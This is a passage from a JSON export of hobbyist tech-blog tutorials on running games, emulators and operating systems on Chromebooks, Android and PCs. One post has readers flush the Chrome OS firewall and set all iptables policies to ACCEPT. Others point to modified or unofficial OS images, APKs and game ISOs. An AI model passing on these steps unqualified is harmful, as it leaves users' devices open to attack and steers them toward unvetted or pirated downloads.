environment that you are using).\r\n\r\nStep 2: Java\r\n\r\nThe next step is to install OpenJDK. If you don&8217;t have the software-center installed, go to terminal and type in:\r\n\r\nsudo apt-get install software-center\r\n\r\nOtherwise, launch the software center, search for OpenJDK and install the latest run time available (Currently, openJDK 7).\r\n\r\n\r\n\r\nStep 3: Minecraft Server\r\n\r\nFinally, download the Minecraft Server jar. Using terminal, navigate to your downloads folder.\r\n\r\ncd Downloads\r\n\r\nThen type in the following:\r\n\r\njava -Xmx1024M -Xms1024M -jar minecraft_server.1.8.7.jar nogui\r\n\r\nspan style=\"line-height: 1.5;\"Keep in mind that you can change the ram requirements to whatever you desire. Also, change Minecraft_server.1.8.7. to match the name of the jar file that you are using./span\r\n\r\nWhen you hit enter, it will take a few seconds and tell you to accept the Eula. Go back to your downloads folder, open the newly generated Eula.txt file and change false to *true *and save the file. The run the previous java command again. If all goes well, it should start the server.\r\n\r\n\r\n\r\nFrom this point, you log onto Minecraft on your desktop and manually add the server (auto-scanning doesn&8217;t work sometimes).\r\n\r\n\r\n\r\nIf you need help finding the IP address of your Chromebook, inside of terminal type in sudo ifconfig and look for the address listed next to Wlan0.\r\n\r\n\r\n\r\nIf you have any questions or comments, feel free to leave them below.\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/07/iptables.jpg\r\n [2]: http://localhost/wordpress/wp-content/uploads/2015/07/openjdk-7.jpg\r\n [3]: http://localhost/wordpress/wp-content/uploads/2015/07/eula.jpg\r\n [4]: http://localhost/wordpress/wp-content/uploads/2015/07/server.jpg\r\n [5]: http://localhost/wordpress/wp-content/uploads/2015/07/minecraft.jpg\r\n",
        "tags": [
            "chrome",
            "chromebook",
            "crouton",
            "linux",
            "minecraft",
            "minecraft server",
            "run",
            "server"
        ]
    },
    {
        "uri": "/play-half-life-on-android-wear/",
        "title": "Play Half Life on Android Wear",
        "content": "{{ youtube VnGscfbCz1g }}\r\n\r\nJust because you can, doesn&#8217;t mean you should. But in this case, you totally should. If you recall, I demonstrated how to play a href=\"http://www.davebennett.tv/play-team-fortress-classic-on-android/\" target=\"blank\"Team Fortress Classic on Android/a using the SDLash app. a href=\"https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CB4QFjAAahUKEwiZwviNqfTGAhUMWT4KHV93C24&url=https%3A%2F%2Fgithub.com%2FSDLash3D&ei=t3myVdmKFoyy-QHf7q3wBg&usg=AFQjCNH9dpTQ4b-sLchi4w-1x-qikvsl5g&sig2=Vix4sHDanmY9-5ZDRoMaBA&bvm=bv.98476267,d.cWw\" target=\"blank\"The app/a is able to emulate the GoldSource game engine, which was used in many of the classic valve games such as Half-Life and Team Fortress. Right now, I am putting together a tutorial on how to play Half-life on Android, but in the meantime, check out how to do it on Android Wear (albeit a little more complicated).\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nSurprisingly, the performance was not as bad as I was expecting. At times, the game got as high as 30fps and other times as low as 2 fps. Of course, things such as the lava graphics and special lightening caused a huge drop in fps. Also, trying to play a game on Android wear is a nightmare within itself. The app offers touchscreen controls, but on a 1.65 inch screen, they are almost impossible to use. Also, swiping to the left causes the screen to go back to the previous window.  Are you still interested in doing this haha? If so, here&#8217;s a *rough guide *on how to play half life on Android wear.\r\n\r\nWhat You Will Need:\r\n\r\n  Original Half Life Game\r\n  a href=\"https://github.com/SDLash3D/xash3d-android-project/releases/download/v0.14.1/xashdroid-release.apk\" target=\"_blank\"SDLash3D Apk/a\r\n  a href=\"https://github.com/SDLash3D/xash3d-android-project/releases/download/v0.14.1/extras.7z\" target=\"_blank\"Extras.7z /a\r\n\r\n Step 1: Enable USB Debugging\r\n\r\nFor this guide, I am going to assume that you have experience with adb and already have it setup on your computer. On your Android wear device, enable USB and bluetooth debugging.  You will need to go into the settings and tap the build number 7 times just like you do on your phone.\r\n\r\n\r\n\r\n&nbsp;\r\n\r\nAlso, enable USB debugging on your Android phone and within the Android wear app.\r\n\r\nOnce it&#8217;s all enabled, use the following command to connect a href=\"https://developer.android.com/training/wearables/apps/bt-debugging.html\" target=\"_blank\"adb to your watch/a so you can transfer files:\r\n\r\n    adb forward tcp:4444 localabstract:/adb-hub\r\n    adb connect localhost:4444\r\n    \r\n\r\nYou might have to accept a debugging confirmation on your watch after you do this. Type adb devices to make sure that your watch is connected.\r\n\r\nspan style=\"color: ff6600;\"a href=\"https://www.youtube.com/watch?v=xdR4VVHHU-8\" target=\"_blank\"If you still need help understanding this, check out my video tutorial on how to sideload apps on Android wear./a/span\r\n\r\nStep 2: Install SDLash3D\r\n\r\nTo install the app to Android wear, simply locate the location of the apk and type in the following:\r\n\r\nadb -e install xashdroid-release.apk\r\n\r\nIt will install an app named _half-life _to your Android wear device.\r\n\r\n Step 2: Xash & Valve Folder\r\n\r\nOn your android wear device, create a folder called xash.  Type in the following:\r\n\r\nadb -e shell\r\n\r\ncd sdcard\r\n\r\nmkdir xash\r\n\r\nThen on your pc, download and extract the extras.7z folder. Move the  valve folder and game controller text file (in the extras 7z zip) to the Valve folder located in your Half-life game on your computer. Have I confused you yet? Just to recap, in your valve folder on your computer (probably located under steamapps/common/half-life) you have the valve folder. Within that valve folder you also have the Valve folder you downloaded from the extras zip and the controller text file from that zip.\r\n\r\n\r\n\r\nNext, create a folder called valve on your Android wear device. Type in the following (I am assuming that you are still in shell from the previous command and currently in the location /sdcard):\r\n\r\nmkdir xash/valve\r\n\r\nNow, let&#8217;s transfer the contents from the valve folder on your computer to the directory:\r\n\r\nexit (to get out of shell)\r\n\r\nadb -e push E:\\Steam\\steamapps\\common\\Half-Life\\valve (change with location of your valve folder) /sdcard/xash/valve\r\n\r\nThis will take about 2 hours to transfer. Once it&#8217;s done, you should be able to launch the half-life app on your Android wear device and the game will load.\r\n\r\n\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/07/Android-Wear-Screenshot2.jpg\r\n [2]: http://localhost/wordpress/wp-content/uploads/2015/07/folderlist.jpg\r\n [3]: http://localhost/wordpress/wp-content/uploads/2015/07/Android-Wear-Screenshot.jpg\r\n",
        "tags": [
            "android",
            "android wear",
            "emulators",
            "game",
            "half",
            "life",
            "source",
            "wear"
        ]
    },
    {
        "uri": "/run-windows-10-from-usb/",
        "title": "Run Windows 10 from USB",
        "content": "If you&#8217;re looking for an ultra portable solution for your computing lifestyle, you might be interested in running Windows 10 from USB. It&#8217;s a good solution if you do light work on multiple computers. Now clearly, this is not the most ideal situation. For one, this will surely shortness the life cycle of your USB with the numerous reads and writes it&#8217;ll have to perform. Also, USB speed is much slower than SATA speed.\n\nNone the less, while gaming might take ages to perform (or rather, it will take a long time to load maps and other in game items), simple tasks such as word processing and Web browsing should be a breeze. Now to do this, you will need to have a USB flash drive (preferably USB 3.0) with at least 16GB of free space.  I&#8217;m using a 30 GB USB 3.0 drive. So here&#8217;s how to run windows 10 from usb.\n\n{{ ad }}\n\nWhat You Will Need:\n\n  Windows 10 iso\n  15 GB Flash Drive\n  a href=\"https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CB4QFjAAahUKEwjwgZGarInHAhUEFz4KHRPiCWo&url=http%3A%2F%2Fwww.easyuefi.com%2Fwintousb%2F&ei=iH-9VfCdLYSu-AGTxKfQBg&usg=AFQjCNENZsENNjk0n0lvpzvdCjdSHlOJg&sig2=QolRVxtYjUPQ0sM8q21wMQ&bvm=bv.99261572,d.cWw\" target=\"blank\" rel=\"noopener\"WinToUSB/a\n\n Step 1: Install Windows using WinToUSB\n\nTo begin, you will need to have a Windows  10 ISO. If you don&#8217;t have one, you can use a href=\"http://www.microsoft.com/en-us/software-download/windows10\" target=\"_blank\" rel=\"noopener\"Microsoft&#8217;s media creation tool/a to download one. Afterwards, use the program WinToUSB to install Windows to your USB drive. You will choose the same partition for the boot and system partition, and choose VHD for the HD type. The process will take about 20 minutes.\n\nStep 2: Booting\n\nOnce it&8217;s done, insert your USB into the computer that you want to boot Windows on. Make sure you select it as the first boot device inside of your bios. On the first boot, it will detect your devices and spend time installing the device drivers. It will reboot again and take you through the setup process.\n\nUsing Windows 10 on a USB:\n\n{{ ad }}\n\nLike I said before, of you value your USB, don&8217;t do this. The number of read and writes that it will be taking will surely shorten the life of it. As far as speed, its bareble but nothing comparable to using a  normal data drive. If something starts to install in the background or download, well, everything comes to a stand still. Otherwise, for lite tasks its usuable\n\n [1]: http://localhost/wordpress/wp-content/uploads/2015/08/wintousb.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2015/08/setting-up.jpg\n",
        "tags": []
    },
    {
        "uri": "/how-to-install-mac-os-x-yosemite-on-any-pc/",
        "title": "How to install Mac OS X Yosemite on any PC",
        "content": "{{ youtube NIgDNCBdoBM }}\r\n\r\nI will be the first to admit that I prefer Windows over Mac OS any day. Besides being a slight Microsoft fanboy, I do prefer Windows because it meets all of my software and gaming needs, but I digress. In any case, there are still some unfortunate situations when I need to have access to Mac OS.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nLuckily, I&#8217;ll show you an easy way on how to install Mac OS X Yosemite on any pc, regardless of the hardware that you currently have installed (even if it is an AMD CPU). Doing this will require a specially modified version of Yosemite called Yosemite-zone.dmg. With a quick Google search, you should be able to find it. As far as performance, I did not encounter any issues. It ran surprisingly smooth even before setting up Multi-beast. Of course, ymmv.\r\n\r\n&nbsp;\r\n\r\nWhat You Will Need:\r\n\r\n  Yosemite-zone.dmg\r\n  a href=\"http://www.acutesystems.com/scrtm.htm\" target=\"_blank\"Transmac/a (Free 15day Trial)\r\n  8GB USB\r\n  A Spare Hard-drive\r\n\r\n Step 1: Format GPT\r\n\r\nThe first thing that you need to do is restore the Yosemite-zone.dmg image to the USB. Open transmac, and right click on your USB. First, select the option to format for Mac (this will change the boot record from MBR to GPT).** Once it completes, select the option to restore the disk image to the USB. It will take about 10 minutes to restore the image. Finally, right click the hard drive**_ _that you want to install Mac OS to choose the option to format for Mac. Keep in mind that you will need a separate hard drive for the Mac OS installation. You will not be able to solely format one partition.\r\n\r\n\r\n\r\nStep 2: Bios\r\n\r\nBefore you boot from your USB, go into your bios settings. This part can get a little complicated depending on your hardware. Make sure that you have secure boot disabled and Vt-D. Also, when you choose boot devices, make sure your USB is not booting with Eefi. Fortunately, I did not have to change anything and kept my bios to the default settings.\r\n\r\n\r\n\r\n Step 3: Boot from USB\r\n\r\nNow boot from the USB. You should see a boot loader screen that will prompt you with what operating system/hard drive to boot with. At the bottom of the screen, you can enter boot flags. If you are using an AMD CPU type in &#8220;/amd&#8221;, or &#8220;/amd32&#8221; or &#8220;/amd64&#8221;. If you run intro trouble during installation, check out a href=\"http://www.macbreaker.com/2012/01/list-of-common-hackintosh-boot-flags29.html\" target=\"blank\"these other boot flags/a that you can use. If you don&#8217;t need to type in anything, simply choose Yosemite from the selection window.\r\n\r\n\r\n\r\nStep 4: Setup\r\n\r\nFrom this point, you will be taken through the standard Mac OS setup. If you already set up your drive in Windows using TransMac, than you can just skip to the installation. If not, make sure to go into Disk Utility and format your desired hard drive. The installation should take about 16 minutes. Once it&8217;s done it will reboot your PC. Remember to reboot from the hard drive Mac OS is installed on (if that fails, try rebooting from the USB again).\r\n\r\n\r\n\r\nStep 5: The Final Steps\r\n\r\nFrom this point, you can go through the normal setup process for Mac OS. As far as compatibility, all my existing hardware worked fine with Mac OS. This included speakers and internet. Of course, you can always install a href=\"http://www.multibeast.com/\" target=\"_blank\"MultiBeast/a to add any post secondary drivers and optimizations.\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/08/restore-disk-image.jpg\r\n [2]: http://localhost/wordpress/wp-content/uploads/2015/08/restore.jpg\r\n [3]: http://localhost/wordpress/wp-content/uploads/2015/08/bios.jpg\r\n [4]: http://localhost/wordpress/wp-content/uploads/2015/08/yosemite-boot.jpg\r\n [5]: http://localhost/wordpress/wp-content/uploads/2015/08/install-location.jpg\r\n [6]: http://localhost/wordpress/wp-content/uploads/2015/08/setting-up-mac.jpg\r\n [7]: http://localhost/wordpress/wp-content/uploads/2015/08/mac-boot.jpg\r\n",
        "tags": [
            "boot",
            "dual",
            "install",
            "mac",
            "pc",
            "yosemite"
        ]
    },
    {
        "uri": "/how-to-install-chrome-os-on-pc/",
        "title": "How to install Chrome OS on PC",
        "content": "I recently came to the realization that Chrome OS is in some ways a perfect operating system. No, I swear I&#8217;m not taking any hallucinogens. Here is a scenario that really opened my mind. I have an aunt who uses a basic low spec PC running Windows XP. All she does is check her email and check Facebook once per day, and that&#8217;s it. Unfortunately, her PC barely meets the requirements to run Windows XP effectively and is constantly cluttered from maleware, Trojans, etc. So after thinking, I came to the conclusion that Chrome OS would be perfect for her. After all, it&#8217;s an operating system focused around the web browser, so she&#8217;ll still have access to everything she needs on the web. In addition, due to the nature of Chrome OS, it would be very difficult compared to Windows to get infected with malware, adware and viruses. Of course, a href=\"http://www.davebennett.tv/install-android-on-pc/\" target=\"_blank\" rel=\"noopener\"installing Android on a PC is another alternative/a.\n\n{{ ad }}\n\nNow before we get started, there is one technicality that must be discussed. Chrome OS is a closed source operating system. There is no way that you are going to be able to run that on any hardware (let alone get a hold of it). Its open source counter-part is called Chromium OS. If you have an Ubuntu desktop, you can build it yourself or use any of the pre-built images found a href=\"http://chromium.arnoldthebat.co.uk/\" target=\"_blank\" rel=\"noopener\"here/a. So here&#8217;s how to install chrome os on pc:\n\nWhat You Will Need:\n\n  a href=\"http://chromium.arnoldthebat.co.uk/\" target=\"_blank\" rel=\"noopener\"Chrome OS/a\n  a href=\"http://sourceforge.net/projects/win32diskimager/\" target=\"_blank\" rel=\"noopener\"Win32Disk Imager/a\n  8 GB USB Drive\n\n Step 1: Bootable USB\n\nFirst, download and extract the Chrome OS image file. Then burn it to your USB using Win32Disk imager.\n\nStep 2: Booting\n\nOn your computer or laptop, make sure to boot from the USB. It should take you into the Chromium setup screen. From this point, you can set up your account and keep Chromium running from your USB.\n\n Install to your Hard Drive (optional):\n\nOn the Chrome Login screen your four account, type in CRTL + ALT + F2 (forward arrow) to bring up the console window. For the login, type in *chronos. *Then type in the following:\n\n{{ ad }}\n\npre/usr/sbin/chromeos-install/pre\n\nThat should install Chromium to your hard drive. It will span style=\"color: #ff0000;\"ERASE EVERYTHING/span.\n\nIf the above command fails, try typing in sudo bash then retyping in the command.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2015/08/win32.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2015/08/chrome.jpg\n",
        "tags": [
            "chrome",
            "chrome os",
            "install",
            "pc"
        ]
    },
    {
        "uri": "/league-of-legends-on-linux/",
        "title": "League of Legends on Linux",
        "content": "{{ youtube TUB0soeTAuw }}\r\n\r\nLeague players are everywhere. Sure, the majority of them are PC users, but there&#8217;s a growing population of Linux gamers out there who want in on the action. Thanks to the program Play On Linux, which makes use of Wine (a popular program that allows many Windows applications to run on Linux), anyone can play League on their alinux computer.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nI should also add that this procedure will also work on an x86 Chromebook with Crouton installed. You might run into a a space limition but symmlinks should be able to fix that. In any case, here&#8217;s how to play League of Legends on Linux.\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\nWhat You Will Need:\r\n\r\n  a href=\"https://www.playonlinux.com/en/\" target=\"_blank\"PlayOnLinux/a\r\n\r\n Step 1: Install PlayOnLinux\r\n\r\nWhen it comes to installing PlayOnLinux, you have two options. First, if you have the Ubuntu software center installed, you can search and install it from there. Otherwise, you can go to the a href=\"https://www.playonlinux.com/en/download.html\" target=\"_blank\"PlayOnLinux downloads page/a  (linked above) and follow the instructions based on your Linux distribution.\r\n\r\nStep 2: Setting Up\r\n\r\nTo install League, go to the option that says new. And search League of Legends. It will give you a few warnings that it&8217;s still in testing. It will also download and install a pre-determined version of Wine for you.\r\n\r\nStep 3: Install\r\n\r\nFrom this point, simply follow the install instructions. Just remember to not change the install location, and uncheck the &8220;run now&#8221; button when the installation  finishes.\r\n\r\nAnd that&#8217;s it. League should now be installed on your computer and ready to go. Performance will be hardware dependent, but compared to running it on Windows, I did not encounter any problems.\r\n",
        "tags": [
            "league",
            "legends",
            "linux",
            "platonlinux",
            "ubuntu"
        ]
    },
    {
        "uri": "/half-life-2-on-android/",
        "title": "Half Life 2 on Android",
        "content": "Let&#8217;s talk about playing Half Life 2 on Android.  If you are lucky enough to own an Nvidia Tegra device (such as the Shield) then you can completely ignore this tutorial because it doesn&#8217;t apply to you. Half Life 2 exists as an exclusive for Nvidia&#8217;s Shield device. Unfortunately, not everyone owns a device that is running the Tegra cpu. Luckily, using the app GlTools, you can emulate the Tegra graphics driver on your device.\n\nThis tutorial is very similar to my previous GlTools tutorial on how to play Portal on Android. Also, if you&#8217;re really old school and hipster, check out playing a href=\"http://www.davebennett.tv/play-half-life-on-android-wear/\" target=\"_blank\" rel=\"noopener\"half life on android wear/a. Keep in mind, if you truly want to experience these games, buying an Nvidia Shield is the way to go. While I was able to get Half Life 2 booted on my Galaxy S6 and running smoothly, I still encountered a lot of texture decoding issues. Obviously you will need the Half Life 2 apk to do this. Unfortunately, you can&#8217;t really buy it from the Play Store unless you have a compatible device. So you will need to look for alternate sources.\n\n{{ ad }}\n\nWhat You Will Need:\n\n  Half Life 2 Apk\n  a href=\"https://play.google.com/store/apps/details?id=com.n0n3m4.gltools\" target=\"_blank\" rel=\"noopener\"GLTools/a\n  a href=\"https://play.google.com/store/apps/details?id=com.locnet.gamekeyboard2\" target=\"_blank\" rel=\"noopener\"Game Keyboard+/a (optional)\n  Rooted Android device\n\n Step 1: GLTools\n\nInstall GLTools from the Play Store. Within the app, select the second decoder (form the top) for the texture plugin and mark all the check boxes at the bottom. Hit install and your device will reboot.\n\nStep 2: Configuring\n\nIf you haven&8217;t already, install the Half Life 2 application. Then go to GLTools and select it from the app list. Make sure the following are checked:\n\n  Enable Custom Settings\n  Optimize GLSL Shaders\n  Use Fake GPU/CPU\n\nThen go to template, and select Tegra 4 Shield as the template. Finally, select all the emulation options at the bottom of the app.\n\nConfiguring the Controller\n\n{{ ad }}\n\nHere is where things can get a little tricky. To play the game, you need a controller. If you don&8217;t have a controller, you can use GameKeyboard+ and use a virtual controller.  You can find the instructions on my tutorial on a href=\"http://www.davebennett.tv/play-portal-on-any-android/\" target=\"_blank\" rel=\"noopener\"Playing Portal on Android/a.\n\nNow if you are using a USB/Bluetooth controller you are still going to run into a few issues. You need to remap your keys (Cross, Square, Circle, Triangle) to Xbox Style controls (A, Y, B, etc.). You can either do this by using a href=\"https://play.google.com/store/apps/details?id=com.dancingpixelstudios.sixaxiscontroller\" target=\"_blank\" rel=\"noopener\"Sixaxis/a or Game Keyboard+. Unfortunately, sixaxis was not working for me, so I had to reluctantly resort to Game Keyboard+. The app is very buggy and caused my phone to freeze multiple times, so avoid it if you can. However, I got it to work by connecting my controller and going through their simple 3 steps setup(Enabling Keyboard in settings and setting it as the default keyboard) and it worked fine. Just a warning, anytime you do anything that involves root within the app, things seems to hang.\n\n&nbsp;\n\ntl;dr. Within Game Keyboard+ connect your USB controller, enabled the Game Keyboard in settings, set it as the default keyboard, and change the usuage mode to Joystick Emulation.\n\nStep 3: Starting the Game\n\nThe first time you start Half Life, it will download  about 2GB of extra content. Afterwards, you should be all set to play. On my Galaxy S6 runng Android Lollipop, the performance was smooth but there were a lot of mixing textures. Of course, YMMV.\n\n [1]: http://www.davebennett.tv/play-portal-on-any-android/\n [2]: http://localhost/wordpress/wp-content/uploads/2015/08/Screenshot_2015-08-29-15-21-25.jpg\n [3]: http://localhost/wordpress/wp-content/uploads/2015/08/Screenshot_2015-08-29-15-17-42.jpg\n [4]: http://localhost/wordpress/wp-content/uploads/2015/08/Screenshot_2015-08-29-15-17-49.jpg\n [5]: http://localhost/wordpress/wp-content/uploads/2015/08/Screenshot_2015-08-29-15-17-57.jpg\n [6]: http://localhost/wordpress/wp-content/uploads/2015/08/Screenshot_2015-08-29-15-13-33.jpg\n [7]: http://localhost/wordpress/wp-content/uploads/2015/08/Screenshot_2015-08-29-15-14-31.jpg\n [8]: http://localhost/wordpress/wp-content/uploads/2015/08/Screenshot_2015-08-29-15-13-46.jpg\n [9]: http://localhost/wordpress/wp-content/uploads/2015/08/Screenshot_2015-08-25-22-14-45.jpg\n",
        "tags": [
            "android",
            "gamie",
            "gltools",
            "half",
            "half life 2",
            "life",
            "root"
        ]
    },
    {
        "uri": "/super-smash-bros-meele-on-android/",
        "title": "Super Smash Bros Meele on Android",
        "content": "One of the best things about Android is that there are a lot of emulators for the platform. You can play games from the PS2, Nintendo DS, PSP, etc. No other mobile platform comes close to the same amount of emulation apps. With that said, one popular emulator that has been lurking around for quite some time is the Dolphin Emulator. It&#8217;s capable of emulating GameCube and Wii games.\n\nFor this tutorial, we&#8217;re going to take a look at running Super Smash Bros Meele on your Android device. Let me kill your hopes first. This isn&#8217;t ready to be a daily driver just yet. Even on my Galaxy S6 with the 64 bit interpreter enabled, the performance is still&#8230;lackluster at best. However, I am still amazed that this even boots. For the longest time, almost nothing worked on the dolphin emulator. So here&#8217;s how to play Super Smash Bros Meele on Android.\n\n{{ ad }}\n\nWhat You Will Need:\n\n  a href=\"https://buildbot.dolphin-emu.org/builders/release-android\" target=\"_blank\" rel=\"noopener\"Dolphin Emulator/a\n  Super Smash Bros ISO (Google)\n  USB Controller (optional)\n\nTo do this is quite simple. Download and install the dolphin emulator apk to your device. If you are using a device with a 64 bit processor (such as the Galaxy S6) enabled the 64 bit recompiler in the settings. This should give you a slight boost in performance. Also, enable the dual clock option.\n\nYou can configure the orientation of the onscreen controls.\n\nAlternatively, you can use a USB controller and key-map the input. However, I did encounter some issues when doing this and had to ultimately rely on the on-screen controls.\n\n{{ ad }}\n\nFinally, select the game and it should boot. Again, the performance is not anything that you&8217;ll be able to brag about, however it works at the very least.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2015/10/Screenshot_2015-10-04-15-14-13.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2015/10/Screenshot_2015-10-04-15-14-37.jpg\n [3]: http://localhost/wordpress/wp-content/uploads/2015/10/Screenshot_2015-10-04-17-48-46.jpg\n",
        "tags": [
            "android",
            "emulation",
            "gamecub",
            "meele.mario",
            "smash",
            "wii"
        ]
    },
    {
        "uri": "/ios-emojis-on-android/",
        "title": "ios Emojis on Android",
        "content": "{{ youtube 2EJ-29-sRjo }}\r\n\r\nEveryone loves those new iOS emojis. One annoying thing about dealing with emojis is that they look different on every platform. Android has the green blobs while ios has the yellow faces.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nIn any case, getting the new ios 90 emojis on your Android device is not that difficult, provided that you have a rooted Android device. Keep in mind though, this will only allow you to receive and interpret ios emojis on your device (so no more boxes with X&#8217;s in them when you receive an emoji from your ios friend) but you will not be able to send the new emojis. That is a little more integrated and requires an update on Android&#8217;s part. So here&#8217;s how to get iOS emojis on Android:\r\n\r\nWhat You Will Need:\r\n\r\n  Rooted Android device\r\n  a href=\"https://play.google.com/store/apps/details?id=com.stevenschoen.emojiswitcher\" target=\"_blank\"Emoji Switcher/a\r\n\r\nFirst download the emoji switcher app from the play store. Within the app you can select what you want to change your emojis to. If you want the iOS emojis, select iOS 9. It will ask for root permission and apply the changes. Afterwards, reboot your Android device.\r\n\r\nimg class=\"alignnone size-large wp-image-1455\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/Sequence-02.00003829.Still002-1024x576.jpg\" alt=\"Emoji Switcher\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00003829.Still002-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00003829.Still002-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00003829.Still002-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.000038_29.Still002.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n\r\nBefore\r\n\r\nimg class=\"alignnone size-large wp-image-1454\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/Sequence-02.00000800.Still001-1024x576.jpg\" alt=\"Before Emoji Change\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00000800.Still001-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00000800.Still001-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00000800.Still001-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.000008_00.Still001.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n\r\nAfter\r\n\r\nimg class=\"alignnone size-large wp-image-1457\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/Sequence-02.00005322.Still004-1024x576.jpg\" alt=\"After Emoji Switcher\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00005322.Still004-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00005322.Still004-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00005322.Still004-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.000053_22.Still004.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n",
        "tags": [
            "android",
            "emojis",
            "emoticons",
            "ios",
            "ios 9",
            "ios emojis android"
        ]
    },
    {
        "uri": "/stream-steam-games-chromebook/",
        "title": "Stream Steam Games Chromebook",
        "content": "{{ youtube x6oLsxNcM78 }}\r\n\r\nHopefully it is clear by now that Chromebooks are not meant for gaming of any type. However, that hasn&#8217;t stopped many of you from accomplishing things like playing a href=\"http://www.davebennett.tech/counter-strike-global-offensive-on-chromebook/\" target=\"blank\"CS:GO/a on your Chromebook or a href=\"http://www.davebennett.tech/how-to-play-ps2-games-on-chromebook/\" target=\"blank\"PS2 Games/a. However, games like CS:GO and TF2 will work on almost any piece of hardware, but something like Fallout 4 won&#8217;t.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nIf you&#8217;re still determined to game from your Chromebook, you can do so via streaming. In fact, you can use Steam&#8217;s built in streaming functionality to &#8220;Stream Steam Games Chromebook&#8221; straight from your gaming rig. You will need to have* a href=\"http://www.davebennett.tech/install-ubuntu-14-04-on-chromebook/\" target=\"_blank\"Linux installed on your Chromebook/a* to do this.\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\nWhat You Will Need:\r\n\r\n  a href=\"http://www.davebennett.tech/install-ubuntu-14-04-on-chromebook/\" target=\"_blank\"Chromebook With Linux Installed/a\r\n  A desktop to Stream From\r\n\r\n Step 1: IP Tables\r\n\r\nChrome OS is really tight on security. Unfortunately, this becomes a pain because Steam&#8217;s streaming system requires some ports to be open in order to communicate with your desktop gaming rig. So let&#8217;s open them. Open up terminal by typing *CRTL + ALT + T. *\r\n\r\nType in the following:\r\n\r\npreshell/pre\r\n\r\npresudo iptables -F/pre\r\n\r\npresudo iptables -P INPUT ACCEPT/pre\r\n\r\npresudo iptables -P FORWARD ACCEPT/pre\r\n\r\npresudo iptables -P OUTPUT ACCEPT/pre\r\n\r\nimg class=\"alignnone size-large wp-image-1460\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/Sequence-02.000156_17.Still005-1024x576.jpg\" alt=\"Chrome IP Tables\" width=\"720\" height=\"405\" /\r\n\r\nAfterwards, start up Linux.\r\n\r\nStep 2: Installing Steam\r\n\r\nThe rest of this is really straight-forward. Install the a href=\"http://store.steampowered.com/about/\" target=\"_blank\"steam package/a from their website.\r\n\r\nAfter you log into Steam, go to settings and select in-home streaming. Of course, make sure that your Chromebook and desktop are connected on the same Wifi network.\r\n\r\nYou should see the name of your desktop (with the status reading &8220;Connected&#8221;).\r\n\r\nimg class=\"alignnone size-large wp-image-1461\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/Sequence-02.00020600.Still006-1024x576.jpg\" alt=\"Steam in Home Streaming\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00020600.Still006-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00020600.Still006-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00020600.Still006-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.000206_00.Still006.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n\r\nWhen you view the games in your Steam Library there should be an option to stream (you don&#8217;t need to install it).\r\n\r\nAnd that&#8217;s it. Keep in mind the streaming quality will vary depending on your network. I wouldn&#8217;t try any super competitive gaming using this.\r\n\r\nimg class=\"alignnone size-large wp-image-1462\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/03/Sequence-02.00023729.Still007-1024x576.jpg\" alt=\"Stream Steam Games to Chromebook\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00023729.Still007-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00023729.Still007-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.00023729.Still007-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/Sequence-02.000237_29.Still007.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n",
        "tags": [
            "chrome",
            "chromebook",
            "crouton",
            "linux",
